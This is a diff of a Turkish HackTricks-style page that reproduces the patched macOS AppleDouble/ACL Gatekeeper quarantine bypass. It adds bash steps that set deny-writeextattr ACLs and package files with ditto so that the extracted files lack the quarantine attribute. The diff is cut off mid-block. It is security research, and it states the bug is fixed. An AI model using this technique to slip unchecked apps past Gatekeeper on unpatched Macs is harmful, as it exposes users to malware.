@@ -1,12 +1,71 @@
-# macOS xattr-acls hakkında ek bilgiler
+# AppleDouble ACL Quarantine Bypass Yeniden Üretimi
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Bu tarihî proof of concept, Achilles Gatekeeper bypass araştırmasında kullanılan AppleDouble/ACL tekniğini yeniden oluşturur. Bir ACL'yi serileştirir, AppleDouble sidecar dosyasında saklar, özniteliği `com.apple.acl.text` olarak yeniden adlandırır ve ZIP dosyasını yeniden paketler.<sup>[[1]](#references)[[2]](#references)</sup>
+Bu tarihî proof of concept, Achilles Gatekeeper bypass araştırmasında kullanılan AppleDouble/ACL tekniğini yeniden oluşturur. Bir ACL'yi serileştirir, AppleDouble sidecar dosyasında saklar, özniteliği `com.apple.acl.text` olarak yeniden adlandırır ve ZIP'i yeniden paketler.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Apple, Gatekeeper bypass'ını macOS Ventura 13, Monterey 12.6.2 ve Big Sur 11.7.2'de düzeltti; mevcut bir Mac'te ACL'yi geri yüklemek, çalışan bir Gatekeeper bypass'ı olduğunu göstermez.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
+Apple, Gatekeeper bypass'ını macOS Ventura 13, Monterey 12.6.2 ve Big Sur 11.7.2 sürümlerinde düzeltti; güncel bir Mac'te ACL'yi geri yüklemek, çalışan bir Gatekeeper bypass'ı olduğunu göstermez.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>
 
-Quarantine ve ilk çalıştırma kontrolleri için [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses) sayfasına bakın.
+Quarantine ve ilk başlatma kontrolleri için bkz. [macOS Gatekeeper](../macos-gatekeeper.md#gatekeeper-bypasses).
+
+## ACL ve AppleDouble dosya sistemi davranışı
+
+### writeextattr ACL
+
+Bu ACL, dosyaya `xattrs` eklenmesini engeller.
+
+```bash
+rm -rf /tmp/test*
+echo test >/tmp/test
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
+ls -le /tmp/test
+ditto -c -k test test.zip
+# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
+
+cd /tmp
+echo y | rm test
+
+# Decompress it with ditto
+ditto -x -k --rsrc test.zip .
+ls -le /tmp/test
+
+# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
+open test.zip
+sleep 1
+ls -le /tmp/test
+```
+
+### **com.apple.acl.text xattr + AppleDouble**
+
+**AppleDouble** dosya biçimi, bir dosyayı ACE'leriyle birlikte kopyalar.
+
+[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), **`com.apple.acl.text`** adlı xattr içinde saklanan ACL metin gösteriminin, açılmış dosyaya ACL olarak ayarlandığını görebilirsiniz. Dolayısıyla, bir uygulamayı başka xattr'ların yazılmasını engelleyen bir ACL ile **AppleDouble** dosya biçiminde bir zip dosyasına sıkıştırırsanız... quarantine xattr uygulamaya ayarlanmaz:
+
+Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) bakın.<sup>[[1]](#references)</sup>
+
+Bunu tekrarlamak için önce doğru ACL dizgesini almamız gerekiyor:
+
+```bash
+# Everything will be happening here
+mkdir /tmp/temp_xattrs
+cd /tmp/temp_xattrs
+
+# Create a folder and a file with the acls and xattr
+mkdir del
+mkdir del/test_fold
+echo test > del/test_fold/test_file
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
+chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
+ditto -c -k del test.zip
+
+# uncomporess to get it back
+ditto -x -k --rsrc test.zip .
+ls -le test
+```
+
+(Not: Bu işe yarasa bile sandbox daha önce quarantine xattr'ını yazar.)
+
+## AppleDouble sidecar oluşturma ve doğrulama
 
 ```bash
 rm -rf /tmp/test*
